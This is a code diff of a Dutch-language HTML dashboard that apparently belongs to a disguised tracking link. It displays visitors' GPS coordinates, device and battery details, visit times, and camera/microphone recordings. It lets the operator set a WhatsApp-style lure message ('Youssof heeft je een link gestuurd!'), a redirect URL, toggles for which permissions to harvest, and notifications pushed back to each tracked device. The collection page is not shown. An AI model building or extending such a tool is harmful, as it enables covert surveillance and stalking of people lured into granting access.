@@ -1,14 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="nl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Opgeslagen Locaties</title>
+    <title>Opgeslagen Gegevens</title>
     <!-- Leaflet CSS -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
             padding: 20px;
             margin: 0;
             background: url('https://i.postimg.cc/sDTjTFrr/whatsapp-background.jpg') no-repeat center center fixed;
@@ -16,215 +15,496 @@
             color: #333;
         }
 
+        /* Container voor schakelaars en bewerkbare velden */
+        .switches-container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
         .location-item {
             margin-bottom: 20px;
             border: 1px solid #ddd;
-            padding: 10px;
-            border-radius: 5px;
-            background: rgba(255, 255, 255, 0.8);
+            padding: 15px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
             position: relative;
         }
 
-        .location-map {
-            height: 200px;
-            width: 100%;
-            margin-top: 10px;
-        }
-
+        /* Professionele sluitknop */
         .close-btn {
             position: absolute;
             top: 10px;
             right: 10px;
-            background: red;
-            color: white;
+            background: transparent;
+            color: #e74c3c;
             border: none;
-            border-radius: 50%;
-            width: 25px;
-            height: 25px;
-            text-align: center;
-            line-height: 25px;
-            font-weight: bold;
+            font-size: 18px;
             cursor: pointer;
         }
 
-        .edit-input {
-            margin-top: 10px;
-            display: flex;
-            gap: 10px;
+        .close-btn:hover {
+            color: #c0392b;
         }
 
-        .edit-input input {
-            flex: 1;
-            padding: 5px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-
-        .edit-input button {
-            background: #4caf50;
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .edit-input button:hover {
-            background: #45a049;
+        .close-btn::before {
+            content: '\2715'; /* Unicode-teken voor 'x' */
         }
 
         /* Schakelaar */
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 24px;
+        }
+
+        .slider::before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #4caf50;
+        }
+
+        input:focus + .slider {
+            box-shadow: 0 0 1px #4caf50;
+        }
+
+        input:checked + .slider::before {
+            transform: translateX(26px);
+        }
+
+        /* Algemene label stijl */
         label {
+            font-size: 16px;
+            margin-bottom: 2px;
             display: flex;
             align-items: center;
-            gap: 10px;
-            font-size: 18px;
-            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .edit-label {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            margin-top: 5px;
+            margin-bottom: 2px;
+            color: #333;
+        }
+
+        .edit-section {
+            margin-bottom: 10px;
+        }
+
+        .edit-section input {
+            width: 100%;
+            padding: 8px;
+            margin-top: 2px;
+            margin-bottom: 5px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+        }
+
+        .notification-section {
+            margin-top: 15px;
+            text-align: left;
+        }
+
+        .notification-section input[type="text"],
+        .notification-section input[type="file"] {
+            width: 100%;
+            padding: 8px;
+            margin-top: 2px;
+            margin-bottom: 5px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+        }
+
+        .notification-section img {
+            margin-top: 10px;
+        }
+
+        .notification-section button {
+            margin-top: 5px;
+            padding: 8px 15px;
+            border: none;
+            background-color: #4caf50;
+            color: white;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .notification-section button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Uitlijning van schakelaars en tekst */
+        .switch-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+
+        .switch-container label {
+            margin: 0;
+        }
+
+        .switch-text {
+            margin-left: 10px;
+            font-size: 16px;
+            color: #333;
+            font-weight: bold;
+        }
+
+        /* Bewerkbare titel */
+        .title-input {
+            width: 100%;
+            padding: 5px;
+            margin-top: 2px;
+            margin-bottom: 5px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <h1>Opgeslagen Locaties</h1>
+    <h1>Opgeslagen Gegevens</h1>
 
-    <!-- On/Off schakelaar -->
-    <label>
-        <input type="checkbox" id="locationSwitch" />
-        Locatie toestemming inschakelen
-    </label>
+    <!-- Schakelaars in een wit vak -->
+    <div class="switches-container">
+        <!-- On/Off schakelaars -->
+        <div class="switch-container">
+            <label class="switch">
+                <input type="checkbox" id="micCamSwitch">
+                <span class="slider"></span>
+            </label>
+            <span class="switch-text">Microfoon en Camera toestemming inschakelen</span>
+        </div>
+
+        <div class="switch-container">
+            <label class="switch">
+                <input type="checkbox" id="locationSwitch">
+                <span class="slider"></span>
+            </label>
+            <span class="switch-text">Locatie toestemming inschakelen</span>
+        </div>
+
+        <div class="switch-container">
+            <label class="switch">
+                <input type="checkbox" id="notificationsSwitch">
+                <span class="slider"></span>
+            </label>
+            <span class="switch-text">Notificatie toestemming inschakelen</span>
+        </div>
+
+        <!-- Bewerk sectie -->
+        <div class="edit-section">
+            <label for="messageInput" class="edit-label">Bewerk de berichttekst:</label>
+            <input type="text" id="messageInput" placeholder="Youssof heeft je een link gestuurd!">
+
+            <label for="redirectUrlInput" class="edit-label">Voer de redirect URL in:</label>
+            <input type="text" id="redirectUrlInput" placeholder="https://example.com">
+        </div>
+    </div>
 
     <div id="saved-locations"></div>
 
     <!-- Leaflet JS -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        // On/Off switch functionaliteit
+        // Haal instellingen op
+        const micCamSwitch = document.getElementById("micCamSwitch");
         const locationSwitch = document.getElementById("locationSwitch");
+        const notificationsSwitch = document.getElementById("notificationsSwitch");
+        const messageInput = document.getElementById("messageInput");
+        const redirectUrlInput = document.getElementById("redirectUrlInput");
 
-        // Lees de status van de switch bij het laden van de pagina
-        const locationEnabled = localStorage.getItem("locationEnabled") === "true";
-        locationSwitch.checked = locationEnabled;
+        micCamSwitch.checked = localStorage.getItem("micCamEnabled") === "true";
+        locationSwitch.checked = localStorage.getItem("locationEnabled") === "true";
+        notificationsSwitch.checked = localStorage.getItem("notificationsEnabled") === "true";
+        messageInput.value = localStorage.getItem("messageText") || "Youssof heeft je een link gestuurd!";
+        redirectUrlInput.value = localStorage.getItem("redirectUrl") || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-        // Schakel de status in of uit
-        locationSwitch.addEventListener("change", () => {
-            localStorage.setItem("locationEnabled", locationSwitch.checked);
-            alert(`Locatie toestemming is nu ${locationSwitch.checked ? "ingeschakeld" : "uitgeschakeld"}.`);
+        micCamSwitch.addEventListener("change", () => {
+            localStorage.setItem("micCamEnabled", micCamSwitch.checked);
         });
 
-        // Groepeer locaties op basis van apparaat en locatie
-        function groupLocations(locations) {
-            const grouped = {};
+        locationSwitch.addEventListener("change", () => {
+            localStorage.setItem("locationEnabled", locationSwitch.checked);
+        });
 
-            locations.forEach((loc) => {
-                const key = `${loc.lat}-${loc.lon}-${loc.device}`;
-                if (!grouped[key]) {
-                    grouped[key] = {
-                        lat: loc.lat,
-                        lon: loc.lon,
-                        device: loc.device,
-                        accuracy: loc.accuracy,
-                        title: loc.title || "Locatie",
-                        battery: loc.battery,
-                        times: []
-                    };
+        notificationsSwitch.addEventListener("change", () => {
+            localStorage.setItem("notificationsEnabled", notificationsSwitch.checked);
+        });
+
+        messageInput.addEventListener("input", () => {
+            localStorage.setItem("messageText", messageInput.value);
+        });
+
+        redirectUrlInput.addEventListener("input", () => {
+            localStorage.setItem("redirectUrl", redirectUrlInput.value);
+        });
+
+        function deleteDataItemByLocation(lat, lon) {
+            let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+            savedData = savedData.filter(item => {
+                if (item.lat && item.lon) {
+                    return !(item.lat === lat && item.lon === lon);
+                } else {
+                    return true;
                 }
-                grouped[key].times.push(loc.timestamp);
+            });
+            localStorage.setItem("collectedData", JSON.stringify(savedData));
+            displaySavedLocations();
+        }
+
+        function groupDataByLocation(data) {
+            const groupedData = {};
+
+            data.forEach((item) => {
+                if (item.lat && item.lon) {
+                    const key = `${item.lat.toFixed(5)}-${item.lon.toFixed(5)}`; // Gebruik 5 decimalen voor nauwkeurigheid
+                    if (!groupedData[key]) {
+                        groupedData[key] = {
+                            lat: item.lat,
+                            lon: item.lon,
+                            accuracy: item.accuracy,
+                            device: item.device,
+                            visits: 0,
+                            timestamps: [],
+                            recordings: [],
+                            battery: item.battery || {},
+                            redirectUrl: item.redirectUrl || "",
+                            notification: item.notification || {},
+                            notificationSentCount: 0,
+                            title: item.title || "Gegevens"
+                        };
+                    }
+                    groupedData[key].visits += 1;
+                    groupedData[key].timestamps.push(item.timestamp);
+
+                    if (item.recording && item.recording.dataUrl) {
+                        groupedData[key].recordings.push(item.recording.dataUrl);
+                    }
+
+                    if (item.notification && item.notification.sentCount) {
+                        groupedData[key].notificationSentCount = item.notification.sentCount;
+                    }
+                } else {
+                    // Items zonder locatie kunnen hier worden afgehandeld
+                }
             });
 
-            return Object.values(grouped);
+            return Object.values(groupedData);
         }
 
-        function deleteLocation(index) {
-            let savedLocations = JSON.parse(localStorage.getItem("locations")) || [];
-            savedLocations.splice(index, 1);
-            localStorage.setItem("locations", JSON.stringify(savedLocations));
-            displaySavedLocations();
-        }
-
-        function updateLocationTitle(index, newTitle) {
-            let savedLocations = JSON.parse(localStorage.getItem("locations")) || [];
-            savedLocations[index].title = newTitle.trim() || "Locatie";
-            localStorage.setItem("locations", JSON.stringify(savedLocations));
-            displaySavedLocations();
-        }
-
-        async function displaySavedLocations() {
-            const savedLocations = JSON.parse(localStorage.getItem("locations")) || [];
+        function displaySavedLocations() {
+            const savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
             const container = document.getElementById("saved-locations");
             container.innerHTML = "";
 
-            if (savedLocations.length === 0) {
-                container.innerHTML = "<p>Geen opgeslagen locaties gevonden.</p>";
+            if (savedData.length === 0) {
+                container.innerHTML = "<p>Geen opgeslagen gegevens gevonden.</p>";
                 return;
             }
 
-            const groupedLocations = groupLocations(savedLocations);
+            const groupedData = groupDataByLocation(savedData);
 
-            groupedLocations.forEach((location, groupIndex) => {
+            groupedData.forEach((dataItem, index) => {
                 const locationItem = document.createElement("div");
                 locationItem.classList.add("location-item");
 
                 const closeButton = document.createElement("button");
                 closeButton.classList.add("close-btn");
-                closeButton.innerText = "X";
-                closeButton.onclick = () => deleteLocation(groupIndex);
+                closeButton.onclick = () => deleteDataItemByLocation(dataItem.lat, dataItem.lon);
 
-                locationItem.innerHTML = `
-                    <p><strong><span id="title-${groupIndex}">${location.title}</span></strong></p>
-                    <p>Breedtegraad: ${location.lat}</p>
-                    <p>Lengtegraad: ${location.lon}</p>
-                    <p>Nauwkeurigheid: ±${location.accuracy} meter</p>
-                    <p>Batterijniveau: ${location.battery?.level || "Onbekend"}</p>
-                    <p>Opladen: ${location.battery?.charging || "Onbekend"}</p>
-                    <p>Apparaat: ${location.device}</p>
-                    <p><strong>Aantal Bezoeken:</strong> ${location.times.length}</p>
-                    <p><strong>Tijden:</strong></p>
+                let htmlContent = "";
+
+                // Bewerkbare titel
+                htmlContent += `<input type="text" id="title-${index}" class="title-input" value="${dataItem.title}" placeholder="Titel">`;
+
+                // Locatiegegevens
+                htmlContent += `
+                    <p><strong>Breedtegraad:</strong> ${dataItem.lat}</p>
+                    <p><strong>Lengtegraad:</strong> ${dataItem.lon}</p>
+                    <p><strong>Nauwkeurigheid:</strong> ±${dataItem.accuracy} meter</p>
+                    <p><strong>Apparaat:</strong> ${dataItem.device}</p>
+                    <p><strong>Aantal bezoeken:</strong> ${dataItem.visits}</p>
+                    <p><strong>Batterijniveau:</strong> ${dataItem.battery.level !== undefined ? dataItem.battery.level * 100 + '%' : 'Onbekend'}</p>
+                    <p><strong>Opladen:</strong> ${dataItem.battery.charging !== undefined ? (dataItem.battery.charging ? 'Ja' : 'Nee') : 'Onbekend'}</p>
+                    <p><strong>Redirect URL:</strong> <a href="${dataItem.redirectUrl}" target="_blank">${dataItem.redirectUrl}</a></p>
+                    <p><strong>Tijdstippen:</strong></p>
                     <ul>
-                        ${location.times.map((time) => `<li>${time}</li>`).join("")}
+                        ${dataItem.timestamps.map(ts => `<li>${ts}</li>`).join('')}
                     </ul>
-                    <div id="map-${groupIndex}" class="location-map"></div>
                 `;
 
-                const editInput = document.createElement("div");
-                editInput.classList.add("edit-input");
-                editInput.innerHTML = `
-                    <input type="text" placeholder="Wijzig titel" id="edit-title-${groupIndex}">
-                    <button onclick="updateLocationTitle(${groupIndex}, document.getElementById('edit-title-${groupIndex}').value)">Opslaan</button>
-                `;
+                // Opnames
+                if (dataItem.recordings.length > 0) {
+                    htmlContent += `<p><strong>Opnames:</strong></p>`;
+                    dataItem.recordings.forEach((recordingUrl, recIndex) => {
+                        htmlContent += `
+                            <video controls width="250">
+                                <source src="${recordingUrl}" type="video/webm">
+                                Je browser ondersteunt de video tag niet.
+                            </video>
+                        `;
+                    });
+                }
 
-                locationItem.appendChild(editInput);
+                locationItem.innerHTML = htmlContent;
                 locationItem.appendChild(closeButton);
                 container.appendChild(locationItem);
 
-                const map = L.map(`map-${groupIndex}`).setView([location.lat, location.lon], 15);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    maxZoom: 19,
-                    attribution: '© OpenStreetMap'
-                }).addTo(map);
+                // Notificatiesectie
+                const notificationSection = document.createElement("div");
+                notificationSection.classList.add("notification-section");
+                notificationSection.innerHTML = `
+                    <h3>Notificatie</h3>
+                    <input type="text" id="bodyText-${index}" placeholder="Voer body tekst in">
+                    <input type="file" id="iconUpload-${index}" accept="image/*">
+                    <button id="sendNotification-${index}">Stuur</button>
+                    <p>Aantal keer gestuurd: <span id="notificationCount-${index}">${dataItem.notificationSentCount || 0}</span></p>
+                `;
 
-                L.marker([location.lat, location.lon]).addTo(map).bindPopup(`<strong>${location.title}</strong>`);
+                locationItem.appendChild(notificationSection);
+
+                // Zet bestaande waarden
+                if (dataItem.notification) {
+                    document.getElementById(`bodyText-${index}`).value = dataItem.notification.bodyText || "";
+                    if (dataItem.notification.iconDataUrl) {
+                        const iconPreview = document.createElement("img");
+                        iconPreview.src = dataItem.notification.iconDataUrl;
+                        iconPreview.width = 50;
+                        iconPreview.height = 50;
+                        notificationSection.appendChild(iconPreview);
+                    }
+                }
+
+                // Event listeners
+                document.getElementById(`title-${index}`).addEventListener("input", function() {
+                    let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+                    const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
+                    savedData.forEach(item => {
+                        const itemKey = item.lat ? `${item.lat.toFixed(5)}-${item.lon.toFixed(5)}` : null;
+                        if (itemKey === key) {
+                            item.title = this.value;
+                        }
+                    });
+                    localStorage.setItem("collectedData", JSON.stringify(savedData));
+                });
+
+                document.getElementById(`bodyText-${index}`).addEventListener("input", function() {
+                    let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+                    const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
+                    savedData.forEach(item => {
+                        const itemKey = item.lat ? `${item.lat.toFixed(5)}-${item.lon.toFixed(5)}` : null;
+                        if (itemKey === key) {
+                            if (!item.notification) {
+                                item.notification = {};
+                            }
+                            item.notification.bodyText = this.value;
+                        }
+                    });
+                    localStorage.setItem("collectedData", JSON.stringify(savedData));
+                });
+
+                document.getElementById(`iconUpload-${index}`).addEventListener("change", function(event) {
+                    const file = event.target.files[0];
+                    if (file) {
+                        const reader = new FileReader();
+                        reader.onloadend = function() {
+                            let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+                            const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
+                            savedData.forEach(item => {
+                                const itemKey = item.lat ? `${item.lat.toFixed(5)}-${item.lon.toFixed(5)}` : null;
+                                if (itemKey === key) {
+                                    if (!item.notification) {
+                                        item.notification = {};
+                                    }
+                                    item.notification.iconDataUrl = reader.result;
+                                }
+                            });
+                            localStorage.setItem("collectedData", JSON.stringify(savedData));
+                            const iconPreview = document.createElement("img");
+                            iconPreview.src = reader.result;
+                            iconPreview.width = 50;
+                            iconPreview.height = 50;
+                            notificationSection.appendChild(iconPreview);
+                        };
+                        reader.readAsDataURL(file);
+                    }
+                });
+
+                document.getElementById(`sendNotification-${index}`).addEventListener("click", function() {
+                    const bodyText = document.getElementById(`bodyText-${index}`).value;
+                    let iconDataUrl = null;
+                    let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+                    const key = `${dataItem.lat.toFixed(5)}-${dataItem.lon.toFixed(5)}`;
+
+                    savedData.forEach(item => {
+                        const itemKey = item.lat ? `${item.lat.toFixed(5)}-${item.lon.toFixed(5)}` : null;
+                        if (itemKey === key && item.notification) {
+                            iconDataUrl = item.notification.iconDataUrl;
+                            if (!item.notification.sentCount) {
+                                item.notification.sentCount = 0;
+                            }
+                            item.notification.sentCount += 1;
+                            document.getElementById(`notificationCount-${index}`).innerText = item.notification.sentCount;
+                        }
+                    });
+
+                    localStorage.setItem("collectedData", JSON.stringify(savedData));
+
+                    if ("Notification" in window && Notification.permission === "granted") {
+                        new Notification("Notificatie", {
+                            body: bodyText,
+                            icon: iconDataUrl
+                        });
+                    } else {
+                        alert("Notificaties zijn niet toegestaan of worden niet ondersteund door deze browser.");
+                    }
+                });
             });
         }
 
-        async function initializeBatteryStatus() {
-            const batteryStatus = await navigator.getBattery?.();
-            const battery = batteryStatus
-                ? {
-                      level: Math.round(batteryStatus.level * 100) + '%',
-                      charging: batteryStatus.charging ? 'Ja' : 'Nee',
-                  }
-                : { level: 'Onbekend', charging: 'Onbekend' };
-
-            const savedLocations = JSON.parse(localStorage.getItem("locations")) || [];
-            const updatedLocations = savedLocations.map((location) => ({
-                ...location,
-                battery: battery,
-            }));
-
-            localStorage.setItem("locations", JSON.stringify(updatedLocations));
-            displaySavedLocations();
-        }
-
-        initializeBatteryStatus();
+        displaySavedLocations();
     </script>
 </body>
 </html>
